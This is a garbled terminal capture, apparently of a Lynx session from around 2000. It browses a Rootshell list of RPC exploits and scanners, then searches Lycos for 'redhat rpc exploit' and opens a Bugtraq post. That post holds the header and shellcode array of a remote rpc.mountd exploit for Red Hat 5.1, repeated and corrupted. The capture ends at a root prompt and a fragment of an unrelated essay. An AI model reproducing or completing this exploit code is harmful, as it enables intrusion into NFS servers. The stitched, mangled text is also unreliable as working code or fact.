includestcp wrapper style access control.6/6/97 h_rpcinfo.tar.gz Allows you to sneak past port filters on port111 and get dumps of RPC services.4/5/97 rpcs.01b.tar.gz This is program that is designed to scansubnets for rpc services.2/14/96 rpc_chk.sh Script to get a list of running hosts from a DNSnameserver for a given domain.2/13/96 mnt.tar.gz Exploits a bug in HP-UX 9 rpc.mountd program and
+
+-- press space for next page --rpc.ttdbserver.c 1   [logo.gif]      Exploits          News        Search Documentation                            _______________Connect from 00-20-78-13-a3-51.bconnected.net [209.53.2.233](Lynx/2.8.3dev.18 libwww-FM/2.14)logged.Rootshell search results2/10/99 pmap_tools.tgz Certain version of rpcbind permit a remoteattacker to insert and delete entries without superuser status byspoofing a source address.10/3/98 mountdscan.c rpc.mountd scanner that looks for servers open tothe Linux rpc.mountd hole.(NORMAL LINK)   Use right-arrow or <return> to activate.mountdscan.c 2 10/5/98 rpc.ttdbserver.c rpc.ttdbserver remote overflow for Solaris,IRIX and HP-UX.7/9/98 smrex.c Buffer Overflow for Sunos 4.1 sendmail - execs/usr/etc/rpc.rexd. (See Phrack 53)7/9/98 drpcscan.tgz Scans ranges of IPs for known RPC services.1/6/98 statd-scan.c A program which scans hosts for the RPC servicestatd.9/7/97 rpc.mountd_bug.txt One can see what files a machine contains bylooking at rpc.mountd responses.7/17/97 securelib.tar.Z Shared library for SunOS 4.1 and later thatwill help protect your RPC daemons.6/11/97 rpcbind_1.1.tgz This is an rpcbind replacement that includestcp wrapper style access control.6/6/97 h_rpcinfo.tar.gz Allows you to sneak past port filters on port111 and get dumps of RPC services.4/5/97 rpcs.01b.tar.gz This is program that is designed to scansubnets for rpc services.2/14/96 rpc_chk.sh Script to get a list of running hosts from a DNSnameserver for a given domain.2/13/96 mnt.tar.gz Exploits a bug in HP-UX 9 rpc.mountd program and
+
+-- press space for next page --rpc.ttdbserver.c 
+
+Hrpc.ttdbserver.c smrex.c smrex.c drpcscan.tgz drpcscan.tgz statd-scan.c statd-scan.c rpc.mountd_bug.txt rpc.mountd_bug.txt securelib.tar.Z securelib.tar.Z rpcbind_1.1.tgz rpcbind_1.1.tgz h_rpcinfo.tar.gz h_rpcinfo.tar.gz rpcs.01b.tar.gz rpcs.01b.tar.gz rpc_chk.sh rpc_chk.sh mnt.tar.gz 3 gives you NFS file handles.Found 13 matching exploits.
+
+---> *NEW* Search Outside Security Sites For "rpc"<--- 2000 Rootshell - Unauthorized duplication of this site isprohibited.
+
+By using this site you agree you will use the information on this site for
+
+lawful purposes only and will not use this information to gain unauthorized
+
+access. Information on this site is for educational purposes ONLY. If you do
+
+not agree with this, please leave now.
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.---> *NEW* Search Outside Security Sites For "rpc"<---2 10/5/98 rpc.ttdbserver.c rpc.ttdbserver remote overflow for Solaris,IRIX and HP-UX.7/9/98 smrex.c Buffer Overflow for Sunos 4.1 sendmail - execs/usr/etc/rpc.rexd. (See Phrack 53)
+
+   7/9/98 drpcscan.tgz Scans ranges of IPs for known RPC services.1/6/98 statd-scan.c A program which scans hosts for the RPC servicestatd.9/7/97 rpc.mountd_bug.txt One can see what files a machine contains bylooking at rpc.mountd responses.7/17/97 securelib.tar.Z Shared library for SunOS 4.1 and later that
+
+   will help protect your RPC daemons.
+
+   6/11/97 rpcbind_1.1.tgz This is an rpcbind replacement that includes
+
+   tcp wrapper style access control.
+
+   6/6/97 h_rpcinfo.tar.gz Allows you to sneak past port filters on port111 and get dumps of RPC services.4/5/97 rpcs.01b.tar.gz This is program that is designed to scansubnets for rpc services.2/14/96 rpc_chk.sh Script to get a list of running hosts from a DNSnameserver for a given domain.2/13/96 mnt.tar.gz Exploits a bug in HP-UX 9 rpc.mountd program and
+
+-- press space for next page --mnt.tar.gz mnt.tar.gz rpc_chk.sh rpc_chk.sh rpcs.01b.tar.gz 
+
+1Hrpcs.01b.tar.gz h_rpcinfo.tar.gz h_rpcinfo.tar.gz rpcbind_1.1.tgz rpcbind_1.1.tgz securelib.tar.Z securelib.tar.Z rpc.mountd_bug.txt rpc.mountd_bug.txt statd-scan.c statd-scan.c drpcscan.tgz 
+
+Hdrpcscan.tgz smrex.c smrex.c rpc.ttdbserver.c rpc.ttdbserver.c smrex.c smrex.c rpc.ttdbserver.c 1   [logo.gif]      Exploits          News        Search Documentation                            _______________Connect from 00-20-78-13-a3-51.bconnected.net [209.53.2.233](Lynx/2.8.3dev.18 libwww-FM/2.14)logged.Rootshell search results2/10/99 pmap_tools.tgz Certain version of rpcbind permit a remoteattacker to insert and delete entries without superuser status byspoofing a source address.10/3/98 mountdscan.c rpc.mountd scanner that looks for servers open tothe Linux rpc.mountd hole.(NORMAL LINK)   Use right-arrow or <return> to activate.mountdscan.c mountdscan.c pmap_tools.tgz pmap_tools.tgz Form field) Enter text.  Use <return> to submit, arrows or tab to move off._______________          Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterG
+
+G______________Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listNORMAL LINK)   Use right-arrow or <return> to activate.DocumentationURL to open: w
+
+mLooking up www.evilnerds.com first.
+Getting http://www.evilnerds.com/
+Looking up www.evilnerds.com.
+Making HTTP connection to www.evilnerds.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer complete                                            evilnerds.com>FRAME: thepageFRAME: pbWere sorry but youve reached a web site that uses frames. You willneed a frames-enabled browser in order to view the site.
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.thepagethepagepb
+
+HGetting http://rstrip.namezero.com/navbar/strip.jsp?name=evilnerds.com&channel
+Looking up rstrip.namezero.com.
+Making HTTP connection to rstrip.namezero.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+rstrip.namezero.com cookie: WebLo=Oh1s6DFNkv5mkmJFQ  Allow? (Y/N/Always/neVer)
+'A'lways allowing from domain 'rstrip.namezero.com'.
+
+Data transfer interrupted.
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+Getting http://www.evilnerds.com/evilnerds.com>FRAME: thepageFRAME: pbWere sorry but youve reached a web site that uses frames. You willneed a frames-enabled browser in order to view the site.
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.pbpbthepageGetting http://home.soneraplaza.nl/mw/prive/wizzkid/evilnerds/index.html
+Looking up home.soneraplaza.nl.
+Making HTTP connection to home.soneraplaza.nl.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Data transfer completeevilnerds.com | main |evilnerds.comunder contruction
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+URL to open: h
+
+mLooking up hack.co.za first.
+Getting http://hack.co.za/
+Looking up hack.co.za.
+Making HTTP connection to hack.co.za.
+Alert!: Unable to connect to remote host.
+Getting http://home.soneraplaza.nl/mw/prive/wizzkid/evilnerds/index.html
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+URL to open: w
+
+7mLooking up www.hack.co.za first.
+Getting http://www.hack.co.za/
+Looking up www.hack.co.za.
+Making HTTP connection to www.hack.co.za.
+Alert!: Unable to connect to remote host
+Getting http://home.soneraplaza.nl/mw/prive/wizzkid/evilnerds/index.html
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+URL to open: w
+
+mLooking up www.insecure.com first.
+Badly formed address www.insecure.com
+
+ing http://home.soneraplaza.nl/mw/prive/wizzkid/evilnerds/index.html
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+URL to open: w
+
+mLooking up www.lycos.com first.
+Getting http://www.lycos.com/
+Looking up www.lycos.com.
+Making HTTP connection to www.lycos.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK       Lycos (p1 of 2)   REFRESH(300 sec): http://www.lycos.com/                 Lycos My Lycos | Site Map[f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1006558?] [f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1006558?] [f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1006558?] Search for:   _________________________  [g.gif]-Submit AdvancedSearchParental ControlsNov. 23, 2000 CONNECT: Boards  Browser  Calendar  Chat  Clubs  Dating  Ecards  EmailInstant Messaging  Translate  Voicemail  Wireless  MORE 3Data transfer complete7(NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/http://www.lycos.com/My LycosMy LycosSite MapSite Map[f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1006558?][f;h=f_textl;pos=3;sz=140x37;tile=3;!category=financial;ord=1006558?][f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1006558?][f;h=f;pos=1;sz=230x33;tile=1;!category=financial;ord=1006558?][f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1006558?][f;h=f_textr;pos=2;sz=140x37;tile=2;!category=financial;ord=1006558?]Text entry field) Enter text.  Use UP or DOWN arrows or tab to move off._________________________            Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterr
+
+;18Hredhat rpc exploit_______  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).[g.gif]-Submit Submitting form...
+Getting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=redhat+rpc+exploit
+Looking up www.lycos.com.
+Making HTTP connection to www.lycos.com.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 202 bytes of data.
+HTTP/1.1 200 OKSearch for: "redhat rpc exploit" 2http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=redhat+rpc+exploitLycos Network Lycos Home  |  Site Map  |  My Lycos   [s.gif][s.gif][s.gif][s.gif][r;kw=redhat+rpc+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=fi                       nancial;ord=388837703?]                  Track this Searchredhat rpc exploit Go Get It! [ ] Search these results[s_crnr.gif][USEMAP:sb1.gif]__________________ Go Get It! [_] 
+
+Data transfer complete7redhat rpc exploit Go Get It! [ ] (NORMAL LINK)   Use right-arrow or <return> to activate.http://www.lycos.com/srch/?lpv=1&loc=meta_index&query=redhat+rpc+exploithttp://www.lycos.com/srch/?lpv=1&loc=meta_index&query=redhat+rpc+exploitLycos NetworkLycos NetworkLycos HomeLycos HomeSite MapSite MapMy LycosMy Lycos[r;kw=redhat+rpc+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=388837703?][r;kw=redhat+rpc+exploit;pos=1;sz=468x60;tile=1;ratio=1_2;!category=financial;ord=388837703?]Track this SearchTrack this SearchText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{t rpc exploit____           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a characterredhat rpc exploit Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).Go Get It! Go Get It! Checkbox Field)   Use right-arrow or <return> to toggle.[ ] [ ] NORMAL LINK)   Use right-arrow or <return> to activate.[USEMAP:sb1.gif]2 [p_books.gif] Save on books at Barnes & Noble.comPOPULAR[ POPULAR | WEB SITES ]  2 Web sites were selected based on user selection trafficBarnes and Noble Keyword]redhat rp GO1. Computer investigations is one of the subjects covered at the    Digital Detective - Computer investigation is one of the subjectscovered at the Digital Detective Workshophttp://www.thecodex.com/hacking.html[Translate]2. A Bit About Security Issue 24 - If you are a potential    website/permanent connection, the first thing you should know    about is security... I, from personal experience know what happens    when people 'hack' into myhttp://www.linuxgazette.com/issue24/berglund.html[p_books.gif][p_books.gif]Barnes & Noble.com
+
+HBarnes & Noble.comWEB SITES WEB SITES Barnes and NobleBarnes and NobleOption list) Hit return and use arrow keys and return to select option.KeywordKeywordText entry field) Enter text.  Use UP or DOWN arrows or tab to move off.{xploit__           Enter text into the field by typing on the keyboard   Ctrl-U to delete all text in field, [Backspace] to delete a character
+
+Hredhat rp Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listForm submit button) Use right-arrow or <return> to submit ('x' for no cache).GOGONORMAL LINK)   Use right-arrow or <return> to activate.Computer investigations is one of the subjects covered at theDigital Detective Computer investigations is one of the subjects covered at theDigital Detective TranslateTranslateA Bit About Security Issue 24 
+3     [Translate]WEB SITESPOPULAR | WEB SITES 1,279 Web sites were found in a search of the complete Lycos Webcatalog 1. rpc.mountd exploit - Date Prev] [Date Next] [Thread Prev] [Thread    Next] [Date Index] [Thread Index] rpc.mountd exploit To:   BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed,http://www.geog.ubc.ca/snag/bugtraq/msg03083.html2. rpc.mountd exploit - Date Prev][Date Next][Thread Prev][Thread   Next][Date Index][Thread Index] rpc.mountd exploit To:BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed, 30 Sehttp://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html[Translate]
+
+-- press space for next page --TranslateTranslatePOPULAR POPULAR rpc.mountd exploit Getting http://click.hotbot.com/director.asp?id=1&target=http://www.geog.ubc.c
+Looking up click.hotbot.com.
+Making HTTP connection to click.hotbot.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Object moved
+Data transfer complete
+HTTP/1.1 302 Object moved
+Using http://www.geog.ubc.ca/snag/bugtraq/msg03083.html
+Getting http://www.geog.ubc.ca/snag/bugtraq/msg03083.html
+Looking up www.geog.ubc.ca.
+Making HTTP connection to www.geog.ubc.ca.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Alert!: HTTP/1.1 404 Not Found
+Data transfer complete                             404 Not FoundNot FoundThe requested URL /snag/bugtraq/msg03083.html was not found on thisserver._________________________________________________________________Apache/1.3.6 Server at www.geog.ubc.ca Port 80
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.
+Getting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=redhat+rpc+exploitSearch for: "redhat rpc exploit" (p3 of 7)[Translate]WEB SITES[ POPULAR | WEB SITES ]1,279 Web sites were found in a search of the complete Lycos Webcatalog1. rpc.mountd exploit - Date Prev] [Date Next] [Thread Prev] [ThreadNext] [Date Index] [Thread Index] rpc.mountd exploit To:BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed,http://www.geog.ubc.ca/snag/bugtraq/msg03083.html[Translate]2. rpc.mountd exploit - Date Prev][Date Next][Thread Prev][ThreadNext][Date Index][Thread Index] rpc.mountd exploit To:BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed, 30 Sehttp://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html[Translate]
+
+-- press space for next page --rpc.mountd exploit rpc.mountd exploit TranslateTranslaterpc.mountd exploit Getting http://click.hotbot.com/director.asp?id=2&target=http://www.csclub.stt
+Looking up click.hotbot.com.
+Making HTTP connection to click.hotbot.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Object moved
+Data transfer complete
+HTTP/1.1 302 Object moved
+Using http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+Getting http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+Looking up www.csclub.stthomas.edu.
+Making HTTP connection to www.csclub.stthomas.edu.
+Sending HTTP request.
+HTTP request sent; waiting for response.
+Read 1 KB of data, 1 KB/sec.
+HTTP/1.1 200 OK              rpc.mountd exploit (p1 of 4_________________________________________________________________Date Prev][Date Next][Thread Prev][Thread Next][Date Index][ThreadIndex]       rpc.mountd exploit_________________________________________________________________* To: BUGTRAQ@netspace.org* Subject: rpc.mountd exploit* From: Hudin Lucian <luci@TRANSART.RO>* Date: Wed, 30 Sep 1998 00:07:59 +0300* Approved-By: route@RESENTMENT.INFONEXUS.COM * Reply-To: Hudin Lucian <luci@TRANSART.RO>* Sender: Bugtraq List <BUGTRAQ@netspace.org>_________________________________________________________________
+
+/*rpc.mountd [remote] exploit by LucySoft [ luci@transart.ro ]
+
+Data transfer completerpc.mountd exploit (p1 of 36-- press space for next page --Date PrevDate PrevDate NextDate NextThread PrevThread PrevThread NextThread NextDate IndexDate IndexThreadIndexThreadIndexBUGTRAQ@netspace.orgBUGTRAQ@netspace.orgluci@TRANSART.ROluci@TRANSART.ROluci@TRANSART.ROluci@TRANSART.ROBUGTRAQ@netspace.org2 [September 20, 1998][version 0.4] tested on Red Hat Linux 5.1 (Manhattan)running nfs-server-2.2beta29I guess patches are available at ftp://ftp.redhat.comNOTE: if the remote host has /etc/exporfs non-empty,[shwomount -e remote_host]you must define __EXPORTS 2 and recompileI've tested on only two RH 5.1 systems, the offset was about 1000.
+
+*/
+
+#define __EXPORTFS1
+
+ftp://ftp.redhat.com3 
+
+#include <unistd.h>
+
+#include <stdio.h>
+
+#include <string.h>
+
+#include <errno.h>
+
+#include <netdb.h>
+
+#include <rpc/rpc.h>
+
+#include <rpc/pmap_prot.h>
+
+#include <rpc/pmap_clnt.h>
+
+#include <sys/socket.h>
+
+#include <sys/time.h>
+
+#include <sys/utsname.h>
+
+#include <sys/stat.h>
+
+#include <arpa/inet.h>
+
+#include <linux/nfs.h>
+
+#include "nfsmount.h"
+
+static unsigned long__offset = 1160;
+
+4 
+
+/*
+
+   check out code.c if you want to know what this means
+
+*/
+
+static char code[] =
+
+{
+
+    0xeb, 0x56, 0x5e, 0x56,
+
+    0x56, 0x56, 0x31, 0xd2,
+
+    0x88, 0x56, 0x0b, 0x88,
+
+    0x56, 0x1e, 0x88, 0x56,
+
+    0x27, 0x88, 0x56, 0x38,
+
+    0xb2, 0x0a, 0x88, 0x56,0x1d, 0x88, 0x56, 0x26,
+
+    0x5b, 0x31, 0xc9, 0x41,0x41, 0x31, 0xc0, 0xb0,0x05, 0xcd, 0x80, 0x50,
+
+    0x89, 0xc3, 0x31, 0xc9,
+
+5 0x31, 0xd2, 0xb2, 0x02,
+
+ 0x31, 0xc0, 0xb0, 0x13,
+
+    0xcd, 0x80, 0x58, 0x89,0xc2, 0x89, 0xc3, 0x59,
+
+    0x52, 0x31, 0xd2, 0xb2,
+
+0c, 0x01, 0xd1, 0xb213, 0x31, 0xc0, 0xb004, 0x31, 0xd2, 0xb212, 0xcd0b31, 0xc0, 0xb0, 0x06cd, 0x80, 0xeb, 0x3fe8, 0xa5, 0xff, 0xffff, 0x2f, 0x65, 0x7463, 0x2f, 0x76173, 0x73, 0x77, 0x6478, 0x7aa, 0x3a
+
+6 0, 0x3a, 0x30, 0x3aa, 0x2f, 0x3a, 0x2f62, 0x69, 0x6e, 0x2f73, 0x68, 0x78, 0x7841, 0x4c, 0x4c, 0x3a41, 0x4c, 0x4c, 0x7878, 0x2f, 0x65, 0x7463, 0x2f, 0x68, 0x6f73, 0x74, 0x73, 0x2e66c, 0x6c, 0x6f77, 0x78, 0xff, 0x5b53, 0x31, 0xc9, 0xb128, 0x01, 0xcb, 0xb102, 0x31, 0xcb005, 0xcd, 0x80, 0x5089, 0xc31, 0xc9
+
+7 1, 0xd2, 0xb2, 0x021, 0xc0, 0xb0, 0x13cd, 0x80, 0x5b, 0x59531, 0xd2, 0xb21f, 0x01, 0xd1, 0xb208, 0x31, 0xc0, 0xb004, 0xcd, 0x80, 0x5b31, 0xc0, 0xb0, 0x06cd, 0x80, 0x31, 0xc00x40, 0xcd, 0x80
+
+};
+
+unsigned long get_esp()
+
+{__asm__("movl %esp,%eax");
+
+}
+
+6 0, 0x3a, 0x30, 0x3aa, 0x2f, 0x3a, 0x2f62, 0x69, 0x6e, 0x2f768, 0x78, 0x7841, 0x4c, 0x4c, 0x3a41, 0x4c, 0x4c, 0x7878, 0x2f, 0x65, 0x7463, 0x2f, 0x68, 0x6f73, 0x74, 0x73, 0x2e
+
+    0x61, 0x6c, 0x6c, 0x6f,0x77, 0x78, 0xff, 0x5b,0x53, 0x31, 0xc9, 0xb1,0x28, 0x01, 0xcb, 0xb1,
+
+    0x02, 0x31, 0xc0, 0xb0, 0x05, 0xcd, 0x80, 0x50,
+
+    0x89, 0xc3, 0x31, 0xc9,
+
+5 1, 0xd2, 0xb2, 0x021, 0xc0, 0xb0, 0x13cd, 0x80, 0x58, 0x89c2, 0x89, 0xc3, 0x5952, 0x31, 0xd2, 0xb20c, 0x01, 0xd1, 0xb213, 0x31, 0xc0, 0xb004, 0x31, 0xd2, 0xb212, 0xcd, 0x80, 0x5b3c0, 0xb0, 0x06cd, 0x80, 0xeb, 0x3fe8, 0xa5, 0xff, 0xffff, 0x2f, 0x65, 0x7463, 0x2f, 0x76173, 0x73, 0x77, 0x6478, 0x7aa, 0x3a
+
+4 
+
+/*check out code.c if you want to know what this means
+
+*/
+
+static char code[] =
+
+{eb, 0x56, 0x5e, 0x5656, 0x56, 0x31, 0xd288, 0x56, 0x0b, 0x8856, 0x1e8627, 0x88, 0x56, 0x38b2, 0x0a, 0x88, 0x561d, 0x88, 0x56, 0x265b, 0x31, 0xc9, 0x4141, 0x31, 0xcb005, 0xcd, 0x80, 0x5089, 0xc31, 0xc9
+
+3 
+
+#include <unistd.h>
+
+#include <stdio.h>
+
+#include <string.h>
+
+#include <errno.h>
+
+#include <netdb.h>
+
+#include <rpc/rpc.h>
+
+#include <rpc/pmap_prot.h>
+
+#include <rpc/pmap_clnt.h>
+
+#include <sys/socket.h>
+
+#include <sys/time.h>
+
+#include <sys/utsname.h>
+
+#include <sys/stat.h>
+
+#include <arpa/inet.h>
+
+#include <linux/nfs.h>
+
+#include "nfsmount.h"
+
+static unsigned long       __offset = 1160;
+
+2 
+
+    [September 20, 1998]
+
+    [version 0.4]
+
+    tested on Red Hat Linux 5.1 (Manhattan)
+
+    running nfs-server-2.2beta29
+
+    I guess patches are available at ftp://ftp.redhat.com
+
+    NOTE: if the remote host has /etc/exporfs non-empty,
+
+    [shwomount -e remote_host]
+
+    you must define __EXPORTS 2 and recompile
+
+    I've tested on only two RH 5.1 systems, the offset was about 1000.
+
+*/
+
+#define __EXPORTFS1
+
+ftp://ftp.redhat.com1  _________________________________________________________________[Date Prev][Date Next][Thread Prev][Thread Next][Date Index][ThreadIndex]rpc.mountd exploit _________________________________________________________________ * To: BUGTRAQ@netspace.org * Subject: rpc.mountd exploit * From: Hudin Lucian <luci@TRANSART.RO>* Date: Wed, 30 Sep 1998 00:07:59 +0300 * Approved-By: route@RESENTMENT.INFONEXUS.COM* Reply-To: Hudin Lucian <luci@TRANSART.RO>
+
+     * Sender: Bugtraq List <BUGTRAQ@netspace.org>_________________________________________________________________
+
+/*rpc.mountd [remote] exploit by LucySoft [ luci@transart.ro ]
+
+BUGTRAQ@netspace.orgBUGTRAQ@netspace.orgluci@TRANSART.ROluci@TRANSART.ROluci@TRANSART.ROGetting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=redhat+rpc+exploitSearch for: "redhat rpc " (p3 of 7[Translate]WEB SITES POPULAR | WEB SITES ]1,279 Web sites were found in a search of the complete Lycos Webcatalog1. rpc.mountd exploit - Date Prev] [Date Next] [Thread Prev] [Thread  Next] [Date Index] [Thread Index] rpc.mountd exploit To:  BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: Hudin  Lucian Date: Wed,  http://www.geog.ubc.ca/snag/bugtraq/msg03083.html  [Translate]2. rpc.mountd exploit - Date Prev][Date Next][Thread Prev][Thread  Next][Date Index][Thread Index] rpc.mountd exploit To:  BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed, 30 Se
+
+  http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html   [Translate]
+
+-- press space for next page --rpc.mountd exploit Getting http://click.hotbot.com/director.asp?id=2&target=http://www.csclub.stt
+Looking up click.hotbot.com.
+Making HTTP connection to click.hotbot.com.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 302 Object moved
+Data transfer complete
+HTTP/1.1 302 Object moved
+Using http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+Getting http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+Looking up www.csclub.stthomas.edu.
+Making HTTP connection to www.csclub.stthomas.edu.
+Sending HTTP request.
+HTTP request sent; waiting for response./1.1 200 OK
+Content-type: text/html
+Retrieving file.  - PLEASE WAIT -
+Data transfer complete                          Download OptionsDownload Options (Lynx Version 2.8.3dev.18)
+
+Downloaded link: http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+
+Suggested file name: msg01912.html
+
+Standard download options:Save to disk
+
+Local additions:View with less
+
+Commands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.Save to diskEnter a filename: msg01912.html
+Saving...
+
+(B)0Download OptionsDownload Options (Lynx Version 2.8.3dev.18)
+
+Downloaded link: http://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html
+
+Suggested file name: msg01912.html
+
+Standard download options:Save to disk
+
+Local additions:View with lessArrow keys: Up and Down to move.  Right to follow a link; Left to go back.H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history listCommands: Use arrow keys to move, '?' for help, 'q' to quit, '<-' to go back.Save to diskGetting http://www.lycos.com/srch/?lpv=1&loc=searchhp&query=redhat+rpc+exploitSearch for: "redhat rpc exploit" (p3 of 7)[Translate]WEB SITES
+
+   [ POPULAR | WEB SITES ]
+
+1,279 Web sites were found in a search of the complete Lycos Web
+
+   catalog1. rpc.mountd exploit - Date Prev] [Date Next] [Thread Prev] [Thread
+
+       Next] [Date Index] [Thread Index] rpc.mountd exploit To:    BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed,http://www.geog.ubc.ca/snag/bugtraq/msg03083.html[Translate]2. rpc.mountd exploit - Date Prev][Date Next][Thread Prev][ThreadNext][Date Index][Thread Index] rpc.mountd exploit To:BUGTRAQ@netspace.org Subject: rpc.mountd exploit From: HudinLucian Date: Wed, 30 Sehttp://www.csclub.stthomas.edu/~bugtraq/1998/msg01912.html[Translate]
+
+-- press space for next page --rpc.mountd exploit rpc.mountd exploit Translate4 3. Re: Exploit of rpc.cmsd - Date Prev][Date Next][ThreadPrev][Thread Next][Date Index][Thread Index] Re: Exploit of    rpc.cmsd To: BUGTRAQ@SECURITYFOCUS.COM Subject: Re: Exploit of    rpc.cmsd From: Casper Dikhttp://www.educ.umu.se/~bjorn/mhonarc-files/bugtraq/msg00105.html  [Translate] 4. OpenNET:  - rpc.mountd exploit - SOFT- LINKS-  unix    TOPIC-  NEWS-  MAP- http://www.opennet.ru/base/exploits/115.txt.html[Translate]5. Bugtraq Mailing List Archive: Re: Exploit of rpc.cmsd - Re:Exploit of rpc.cmsd Casper Dik (casper@HOLLAND.SUN.COM) Thu, 15   Jul 1999 23:58:04 +0200 Messages sorted by: [ date ] [ thread ] [subject ] [ author ] Next message: Mike Perry: "Re: Shared memoryhttp://members.cotse.com/mailing-lists/bugtraq/1999/0635.html[Translate]6. BugTraq Archive: Re: Exploit of rpc.cmsd - Re: Exploit of rpc.cmsdCasper Dik (casper@HOLLAND.SUN.COM) Thu, 15 Jul 1999 23:58:04
+
+2HRe: Exploit of rpc.cmsd Re: Exploit of rpc.cmsd TranslateTranslateOpenNET:  - rpc.mountd exploit OpenNET:  - rpc.mountd exploit TranslateTranslateBugtraq Mailing List Archive: Re: Exploit of rpc.cmsd Bugtraq Mailing List Archive: Re: Exploit of rpc.cmsd TranslateTranslateBugTraq Archive: Re: Exploit of rpc.cmsd 
+5    +0200 Messages sorted by: [ date ] [ thread ] [ subject ] [ author] Next message: Mike Perry: "Re: Shared memoryhttp://www.aistrat.com/list-archive/bugtraq/1999/Jul/0125.html[Translate]7. BugTraq Archive: rpc.mountd exploit - rpc.mountd exploit HudinLucian (luci@TRANSART.RO) Wed, 30 Sep 1998 00:07:59 +0300 Messages   sorted by: [ date ] [ thread ] [ subject ] [ author ] Nextmessage: morex .-: "Re: rpc.mountd vulnerabilitiehttp://www.securityportal.com/list-archive/bugtraq/1998/Sep/0238.html8. OpenNET:  - rpc.mountd exploit - an error occurred while   processing this directive] rpc.mountd exploit <http://www.trunk.ru/~mc/linux/base/exploits/115.txt.html[Translate]9. redhat.com | Red Hat Support - Red Hat Support Support HomeDocumentation & Online Resources Updates & Errata Support ProgramsRed Hat Linux 5.2 (Apollo) General ErrataBack to Red Hat Linux   Errata The following are known problehttp://www.redhat.com/support/errata/rh52-errata-general.html
+
+TranslateTranslateBugTraq Archive: rpc.mountd exploit BugTraq Archive: rpc.mountd exploit TranslateTranslateOpenNET:  - rpc.mountd exploit OpenNET:  - rpc.mountd exploit TranslateTranslateredhat.com | Red Hat Support 
+
+Exiting via interrupt: 2
+
+Ginger snap.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# j
+
+ktop  msg01912.html
+
+Each of these cults correspond to one of the two antagonists in the age of
+Reformation.  In the realm of the Apple Macintosh, as in Catholic Europe,
+worshipers peer devoutly into screens filled with "icons."  All is sound and
+imagery and Appledom.  Even words look like decorative filigrees in exotic
+typefaces.  The greatest icon of all, the inviolable Apple itself, stands in
+the dominate position at the upper-left corner of the screen.  A central
+corporate headquarters decrees the form of all rites and practices.
+Infalliable doctrine issues from one executive officer whose selection occurs
+in a sealed boardroom.  Should anyone in his curia question his powers, the
+offender is excommunicated into outer darkness.  The expelled heretic founds
+a new company, mutters obscurely of the coming age and the next computer,
+then disappears into silence, taking his stockholders with him.  The mother
+company forbids financial competition as sternly as it stifles ideological
